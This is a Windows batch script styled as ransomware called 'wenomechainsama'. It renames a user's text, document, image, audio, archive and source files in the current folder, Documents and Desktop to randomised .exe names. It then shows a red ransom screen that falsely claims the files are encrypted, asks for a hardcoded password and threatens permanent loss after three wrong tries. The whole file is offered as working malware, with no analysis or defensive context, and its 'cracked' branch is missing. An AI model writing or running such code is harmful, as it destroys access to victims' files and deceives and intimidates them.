@echo off

title wenomechainsama.exe

:essentials

IF EXIST *.txt goto txtran

IF EXIST *.docx goto docxran

IF EXIST *.html goto htmlran

IF EXIST *.WAV goto wavran

IF EXIST *.WMA goto wmaran

IF EXIST *.KBS goto kbsran

IF EXIST *.vbs goto vbsran

IF EXIST *.rar goto rarran

IF EXIST *.zip goto zipran

IF EXIST *.java goto javaran

IF EXIST *.cpp goto cppran

IF EXIST *.png goto pngran

IF EXIST *.jpg goto jpgran

IF EXIST *.mp3 goto mp3ran

IF NOT EXIST *.txt goto task2

IF NOT EXIST *.docx goto task2

IF NOT EXIST *.html goto task2

IF NOT EXIST *.WAV goto task2

IF NOT EXIST *.WMA goto task2

IF NOT EXIST *.KBS goto task2

IF NOT EXIST *.vbs goto task2

IF NOT EXIST *.rar goto task2

IF NOT EXIST *.zip goto task2

IF NOT EXIST *.java goto task2

IF NOT EXIST *.cpp goto task2

IF NOT EXIST *.png goto task2

IF NOT EXIST *.jpg goto task2

IF NOT EXIST *.mp3 goto task2

:txtran

RENAME *.txt wenomechainsama encrypt(%RANDOM%).exe

GOTO essentials

:docxran

RENAME *.docx wenomechainsama encrypt(%RANDOM%).exe

GOTO essentials

:htmlran

RENAME *.html wenomechainsama encrypt(%RANDOM%).exe

GOTO essentials

:wavran

RENAME *.WAV wenomechainsama encrypt(%RANDOM%).exe

GOTO essentials

:wmaran

RENAME *.WMA wenomechainsama encrypt(%RANDOM%).exe

GOTO essentials

:kbsran

RENAME *.KBS wenomechainsama encrypt(%RANDOM%).exe

GOTO essentials

:vbsran

RENAME *.vbs wenomechainsama encrypt(%RANDOM%).exe

GOTO essentials

:rarran

RENAME *.rar wenomechainsama encrypt(%RANDOM%).exe

GOTO essentials

:zipran

RENAME *.zip wenomechainsama encrypt(%RANDOM%).exe

GOTO essentials

:javaran

RENAME *.java wenomechainsama encrypt(%RANDOM%).exe

GOTO essentials

:cppran 

RENAME *.cpp wenomechainsama encrypt(%RANDOM%).exe

GOTO essentials

:pngran

RENAME *.png wenomechainsama encrypt(%RANDOM%).exe

GOTO essentials

:jpgran

RENAME *.jpg wenomechainsama encrypt(%RANDOM%).exe

GOTO essentials

:mp3ran

RENAME *.mp3 wenomechainsama encrypt(%RANDOM%).exe

GOTO essentials

:no

:task2

cd\

cd C:\Users\%USERNAME%\Documents

IF EXIST *.txt goto txtran

IF EXIST *.docx goto docxran

IF EXIST *.html goto htmlran

IF EXIST *.WAV goto wavran

IF EXIST *.WMA goto wmaran

IF EXIST *.KBS goto kbsran

IF EXIST *.vbs goto vbsran

IF EXIST *.rar goto rarran

IF EXIST *.zip goto zipran

IF EXIST *.java goto javaran

IF EXIST *.cpp goto cppran

IF EXIST *.png goto pngran

IF EXIST *.jpg goto jpgran

IF EXIST *.mp3 goto mp3ran

IF NOT EXIST *.txt goto task3

IF NOT EXIST *.docx goto task3

IF NOT EXIST *.html goto task3

IF NOT EXIST *.WAV goto task3

IF NOT EXIST *.WMA goto task3

IF NOT EXIST *.KBS goto task3

IF NOT EXIST *.vbs goto task3

IF NOT EXIST *.rar goto task3

IF NOT EXIST *.zip goto task3

IF NOT EXIST *.java goto task3

IF NOT EXIST *.cpp goto task3

IF NOT EXIST *.png goto task3

IF NOT EXIST *.jpg goto task3

IF NOT EXIST *.mp3 goto task3

:task3

cd\

cd C:\Users\%USERNAME%\Desktop

IF EXIST *.txt goto txtran

IF EXIST *.docx goto docxran

IF EXIST *.html goto htmlran

IF EXIST *.WAV goto wavran

IF EXIST *.WMA goto wmaran

IF EXIST *.KBS goto kbsran

IF EXIST *.vbs goto vbsran

IF EXIST *.rar goto rarran

IF EXIST *.zip goto zipran

IF EXIST *.java goto javaran

IF EXIST *.cpp goto cppran

IF EXIST *.png goto pngran

IF EXIST *.jpg goto jpgran

IF EXIST *.mp3 goto mp3ran

IF NOT EXIST *.txt goto msg

IF NOT EXIST *.docx goto msg

IF NOT EXIST *.html goto msg

IF NOT EXIST *.WAV goto msg

IF NOT EXIST *.WMA goto msg

IF NOT EXIST *.KBS goto msg

IF NOT EXIST *.vbs goto msg

IF NOT EXIST *.rar goto msg

IF NOT EXIST *.zip goto msg

IF NOT EXIST *.java goto msg

IF NOT EXIST *.cpp goto msg

IF NOT EXIST *.png goto msg

IF NOT EXIST *.jpg goto msg

IF NOT EXIST *.mp3 goto msg



:msg

color 4f

cls

ECHO -----------------------------------------------------You Have Been Encrypted With wenomechainsama!-------------------------------------------------------------

ECHO _______________________________________________________________________________________________________________________

ECHO _______________________________________________________________________________________________________________________

ECHO You can get your files back only if you have the password key:

ECHO Security key is impossible to crack however if you think you are too smart you have three chances to try.

ECHO After three wrong keys the decryptor will be removed from your pc!

ECHO

:yes

SET /P pass=Enter Password(3 chances left):

IF %pass%==@{[grogumasterkey]}@ goto cracked

IF NOT %pass%==@{[grogumasterkey]}@ goto incorrect1

:incorrect1

ECHO Incorrect password!

SET /P pass=Enter Password(2 chances left):

IF %pass%==@{[grogumasterkey]}@ goto cracked

IF NOT %pass%==@{[grogumasterkey]}@ goto incorrect2

PAUSE

EXIT

:incorrect2

ECHO Incorrect password!

SET /P pass=Enter Password(1 chance left):

IF %pass%==@{[grogumasterkey]}@ goto cracked

IF NOT %pass%==@{[grogumasterkey]}@ goto incorrect3

:incorrect3

echo your files are now locked forever

PAUSE

EXIT
